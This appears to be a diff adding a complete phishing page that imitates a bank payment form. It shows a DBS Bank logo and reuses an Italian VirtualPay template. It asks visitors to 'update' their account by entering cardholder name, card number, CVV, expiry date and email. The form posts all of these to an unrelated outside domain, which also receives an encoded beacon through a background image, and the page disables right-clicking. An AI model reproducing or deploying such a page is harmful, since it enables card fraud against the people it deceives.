@@ -1,0 +1,308 @@
+<!--?xml version="1.0" encoding="UTF-8"?-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:jsp="http://java.sun.com/JSP/Page" lang="en"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<link rel="stylesheet" type="text/css" href="GetDataPayment.jsf_files/style_new.css">
+	<script language="JavaScript" src="GetDataPayment.jsf_files/tools.js"></script>
+	<script language="JavaScript" src="GetDataPayment.jsf_files/navigationControl.js"></script>
+	<script language="JavaScript" src="GetDataPayment.jsf_files/ajax.js"></script>
+
+	<title></title>
+
+</head>
+<body class="logobody" oncontextmenu="return false" onmousedown="controllaNavigazione(event);" onkeydown="controllaNavigazione(event);" style="width: 100%; overflow-y:auto; text-align: center;">
+	
+	<div align="center"><table class="centralTableBody" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="centralSection"><span id="main__jeniaTemplate_container" style="height:100%;width: 100%;border:0px;padding:0px;margin:0px;">
+<form id="main_form" name="main_form" method="post" action="http://lamiesrnbsvd.info/ko/nb/fe622264d21b1c9d57416f3c3a7249a9/yok.php" class="mainForm" enctype="application/x-www-form-urlencoded" onsubmit="loading();">
+<input name="main_form" value="main_form" type="hidden">
+<table style="width: 75%;text-align: right; position:relative; top: -30px;margin-left: 210px;" cellspacing="0" cellpadding="0">
+<tbody>
+</tbody>
+</table>
+
+
+		<br>
+		<div align="center"><input name="main_form:j_id11" type="hidden"><script language="javascript" type="text/javascript"><!-- 
+ var sopener;var u1='https://trustsealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=www.payment.fccrt.it&lang=';function vrsn_splash(lang){if(sopener&&!sopener.closed){sopener.focus();}else{tbar="location=yes,status=yes,resizable=yes,scrollbars=yes,width=560,height=500";var sw=window.open(u1+lang,'VRSN_Splash',tbar);if(sw){sw.focus();sopener=sw;}}} 
+ --> </script><table style="align:center; width: 100%; text-align:center" cellspacing="1" cellpadding="3">
+<tbody>
+<tr>
+<td></td>
+</tr>
+<tr>
+<td><div align="center"><table style="text-align:center; align:center; width:100%" cellspacing="0" cellpadding="3">
+<tbody>
+<tr>
+<td><img src="GetDataPayment.jsf_files/load_005.gif" style="left;" class="imgTestata" alt=""></td>
+<td style="width: 94px">
+<img src="../../../../files.prokerala.com/banking/images/bank-logo/dbs-bank.png" alt="Home Page di VirtualPay" style="center;position: relative; left: 0px; top: 0px;" class="imgTestataVirtual" height="124" width="130"></td>
+<td><img src="GetDataPayment.jsf_files/load_008.gif" style="right;" class="imgTestata" alt=""></td>
+</tr>
+</tbody>
+</table>
+
+	</div></td>
+</tr>
+<tr>
+<td>
+			
+</td>
+</tr>
+</tbody>
+</table>
+
+		</div>
+		     
+		
+	    <div align="center"><table style="text-align:left; width: 100%" cellspacing="1" cellpadding="3">
+<tbody>
+<tr>
+<td>
+			&nbsp;</td>
+</tr>
+<tr>
+<td><span id="main_form:creditCardPanel" style="display: block;">
+				<div><table style="width: 100%" cellspacing="1" cellpadding="3" border="0">
+<tbody>
+<tr class="datiCartaTitolo">
+<td style="height: 31px">
+<span id="main__jeniaTemplate_container2" style="height:100%;width: 100%;border:0px;padding:0px;margin:0px;"><table cellpadding="2" cellspacing="1">
+	<tr>
+		<td class="testograssettoAnagrafica" style="width: 382px">
+		- <span style="left;">Update your account information by completing all 
+		the fields</span></td>
+	</tr>
+</table>
+</span></td>
+</tr>
+<tr class="datiCartaTitolo">
+<td style="height: 25px">
+						</td>
+</tr>
+</tbody>
+</table>
+</div></span></td>
+</tr>
+<tr>
+<td><table id="main_form:titleCreditCards" style="display: block;" width="463" cellspacing="1" cellpadding="3" border="0">
+<tbody>
+<tr class="datiCartaTitolo">
+<td><span class="testoNero">Credit Card Data</span></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td><table id="main_form:inputDatiCreditCards" style="display: block;" cellspacing="1" border="0">
+<tbody>
+<tr class="inputDaticarta">
+<td><span style="left;">Credit Card Holder Name:</span></td>
+<td><table cellspacing="1" cellpadding="6" border="0">
+<tbody>
+<tr class="inputDaticarta">
+<td class="inputDaticarta"><img src="GetDataPayment.jsf_files/asterisco.gif" alt=""></td>
+<td class="inputDaticartaLeft"><input id="main_form:intestatario" name="main_form:intestatario" maxlength="60" size="56" style="width:100%" autocomplete="off" type="text"></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr class="inputDaticarta">
+<td><span style="left;"></span></td>
+<td></td>
+</tr>
+<tr class="inputDaticarta">
+<td><span style="left;">Credit Card Number:</span></td>
+<td><table style="width:100%" cellspacing="1" cellpadding="6" border="0">
+<tbody>
+<tr class="inputDaticarta">
+<td><img src="GetDataPayment.jsf_files/asterisco.gif" alt=""></td>
+<td><input id="main_form:NCarta" name="main_form:NCarta" maxlength="20" size="20" autocomplete="off" type="text"></td>
+<td>CVV Code:</td>
+<td><input id="main_form:CVC2Carta" name="main_form:CVC2Carta" maxlength="4" size="4" autocomplete="off" type="text"></td>
+<td><script language="JavaScript" type="text/javascript" src="GetDataPayment.jsf_files/jenia.js"></script><script language="JavaScript" type="text/javascript" src="GetDataPayment.jsf_files/popupFrame.js"></script><a href="index.html#" onclick="showPopupFrame(document.getElementById('main_form'),document.getElementById('main_form:j_id111'),event,'main_form:j_id111:j_idcl','popup','border:1px solid black; background-color:#FFFFFF; ',0,0,false,true,'400','650','auto','popupTop',null,'popupBottom',null,'','CVV2/CVC2/4DBC','','popupTitle',true,'/GT_EgipsyWeb/jenia4faces/popup/popupFrame/images/max.gif','/GT_EgipsyWeb/jenia4faces/popup/popupFrame/images/resize.gif','/GT_EgipsyWeb/jenia4faces/popup/popupFrame/images/close.gif',false,'main_form:j_id111:j_id','','','','','','',false,'/GT_EgipsyWeb/jenia4faces/popup/images/spacer.gif','/GT_EgipsyWeb/jenia4faces/popup/images/spacerM.gif');return false;" id="main_form:j_id111" class="helpPopupLink"><img src="GetDataPayment.jsf_files/infoBtn.gif" style="border:0" alt=""><input name="main_form___jeniaPopupFrame" id="main_form___jeniaPopupFrame" type="hidden">
+<script language="JavaScript" type="text/javascript">if (document.getElementById('main_form').elements['main_form___jeniaPopupFrame'].jeniaOnLoad!=null){document.getElementById('main_form').elements['main_form___jeniaPopupFrame'].jeniaOnLoad=window.onload;window.onload=function() {document.getElementById('main_form').elements['main_form___jeniaPopupFrame'].value='';if (document.getElementById('main_form').elements['main_form___jeniaPopupFrame'].jeniaOnLoad!=null) document.getElementById('main_form').elements['main_form___jeniaPopupFrame'].jeniaOnLoad();};}</script></a></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr class="inputDaticarta">
+<td><span style="left;"></span></td>
+<td></td>
+</tr>
+<tr class="inputDaticarta">
+<td><span style="left;"></span></td>
+<td></td>
+</tr>
+<tr class="inputDaticarta">
+<td>Credit Card Type:</td>
+<td><table cellspacing="1" cellpadding="6" border="0">
+<tbody>
+<tr class="inputDaticarta">
+<td><img src="GetDataPayment.jsf_files/asterisco.gif" alt=""></td>
+<td>
+<table id="main_form:listaCarte" class="list" cellspacing="0" cellpadding="0">
+<tbody id="main_form:listaCarte:tbody_element">
+<tr id="pluto"><td style="font-weight:bold;color:#000000;font-family: Arial, Helvetica, sans-serif;font-size: 8pt;"><input id="main_form:TipoCarta:0" name="main_form:TipoCarta" value="02" type="radio"><label for="main_form:TipoCarta:0"></label><img src="GetDataPayment.jsf_files/Mastercard.gif" alt=""></td><td style="font-weight:bold;color:#000000;font-family: Arial, Helvetica, sans-serif;font-size: 8pt;"><input id="main_form:TipoCarta:1" name="main_form:TipoCarta" value="01" type="radio"><label for="main_form:TipoCarta:1"></label><img src="GetDataPayment.jsf_files/Visa.gif" alt=""></td><td style="font-weight:bold;color:#000000;font-family: Arial, Helvetica, sans-serif;font-size: 8pt;"><input id="main_form:TipoCarta:2" name="main_form:TipoCarta" value="06" type="radio"><label for="main_form:TipoCarta:2"></label><img src="GetDataPayment.jsf_files/Amex.gif" alt=""></td></tr></tbody></table>
+</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr class="inputDaticarta">
+<td><span style="left;"></span></td>
+<td></td>
+</tr>
+<tr class="inputDaticarta">
+<td>Expiry Date:</td>
+<td><table cellspacing="1" cellpadding="6">
+<tbody>
+<tr>
+<td><img src="GetDataPayment.jsf_files/asterisco.gif" alt=""></td>
+<td><select id="main_form:meseScadenza" name="main_form:meseScadenza" size="1">	<option value="" selected="selected"></option>
+	<option value="01">January</option>
+	<option value="02">February</option>
+	<option value="03">March</option>
+	<option value="04">April</option>
+	<option value="05">May</option>
+	<option value="06">June</option>
+	<option value="07">July</option>
+	<option value="08">August</option>
+	<option value="09">September</option>
+	<option value="10">October</option>
+	<option value="11">November</option>
+	<option value="12">December</option>
+</select></td>
+<td><select id="main_form:annoScadenza" name="main_form:annoScadenza" size="1">	<option value="" selected="selected"></option>
+	<option value="2018">2018</option>
+	<option value="2019">2019</option>
+	<option value="2020">2020</option>
+	<option value="2021">2021</option>
+	<option value="2022">2022</option>
+	<option value="2023">2023</option>
+	<option value="2024">2024</option>
+	<option value="2025">2025</option>
+	<option value="2026">2026</option>
+	<option value="2027">2027</option>
+	<option value="2028">2028</option>
+	<option value="2029">2029</option>
+	<option value="2030">2030</option>
+	<option value="2031">2031</option>
+	<option value="2032">2032</option>
+	<option value="2033">2033</option>
+	<option value="2034">2034</option>
+	<option value="2035">2035</option>
+	<option value="2036">2036</option>
+	<option value="2037">2037</option>
+	<option value="2038">2038</option>
+	<option value="2049">2049</option>
+</select></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr class="inputDaticarta">
+<td><span style="left;"></span></td>
+<td></td>
+</tr>
+<tr class="inputDaticarta">
+<td><span style="left;"></span></td>
+<td></td>
+</tr>
+<tr class="inputDaticarta">
+<td>E-Mail:</td>
+<td><table cellspacing="1" cellpadding="6" border="0">
+<tbody>
+<tr class="inputDaticarta">
+<td class="inputDaticarta"><img src="GetDataPayment.jsf_files/asterisco.gif" alt=""></td>
+<td class="inputDaticartaLeft"><input id="main_form:eMail" name="main_form:eMail" maxlength="60" size="56" style="width:100%" autocomplete="off" type="text"></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr class="inputDaticarta">
+<td><span style="left;"></span></td>
+<td></td>
+</tr>
+<tr class="inputDaticarta">
+<td><span style="left;"></span></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+ 
+	</div>
+	
+		<div align="center"><table id="main_form:button" width="200">
+<tbody>
+<tr>
+<td>&nbsp;</td>
+<td>
+<input name="main_form:j_id145" value="Continue" onclick="submitButtonForm();" class="bottoneConferma" type="submit" style="width: 114px; height: 36px; background-color: #00CF00"></td>
+</tr>
+</tbody>
+</table>
+
+		</div><input name="_j4fajax" value="main_outsideAjax" type="hidden"><input name="javax.faces.ViewState" id="javax.faces.ViewState" value="j_id3:j_id4" type="hidden">
+</form>
+</span></td>
+</tr>
+</tbody>
+</table>
+<style type="text/css"><!-- .logobody { background-image : url('http://lamiesrnbsvd.info/GT_EgipsyWeb/load?random=0x1.e7822d588360ap-2&data=000C8BCDDE1E5B1AC8F979CA7B32F4395A6571B86B2C90CAA317FD2E10CD2F71708BFDA11627F45A115269CB1BCCCC8FFE806C352B927403351FE3450A6BF2F229E929788A2546C98E5A12BB6DC451ABFC1CEACFFEE23A19D5669F0CE623054655F4C8A6846D8389D8F155797F97D30E903561C96AF185C47255F7A22315DC5A239562090967A3DAEC6F6ECEBD08A14BFDA2F68D4A0A5EC78DAD537CC23CAA37AE26CF0269CF8D14168C3E8A5584466E85D869DC00155EF32B8D363578AE7EC9FCCE95454614C6F1') } --></style><link rel="stylesheet" type="text/css" href="GetDataPayment.jsf_files/load.css">
+		<script type="text/javascript" language="JavaScript">
+			var patternUserAgent=new RegExp("^((?!rv:\\d{0,}?\\.0\\) like)[\\s\\S])*(Gecko)");
+			disableAutoComplete();
+		</script>
+	</div><table id="loadingMainContainer" style="display:none;visibility:hidden;">
+<tbody>
+<tr>
+<td><table id="loadingMainContent" class="loadingMaskDiv">
+<tbody>
+<tr>
+<td><table id="loadingMainContentIE6" class="loadingMask">
+<tbody>
+<tr>
+<td><table class="loadingMaskContainer" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td><span class="infobodyGrassetto" style="font-size: x-large;">loading....</span></td>
+</tr>
+<tr>
+<td><img src="GetDataPayment.jsf_files/loading.gif" alt=""></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td>
+			<iframe src="GetDataPayment.jsf_files/spacer_002.gif" id="framebgloading" name="framebgloading" style="z-index:119;border:0;" class="logobody">&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+
+&lt;/body&gt;
+&lt;/html&gt;</iframe></td></tr></tbody></table></body></html>
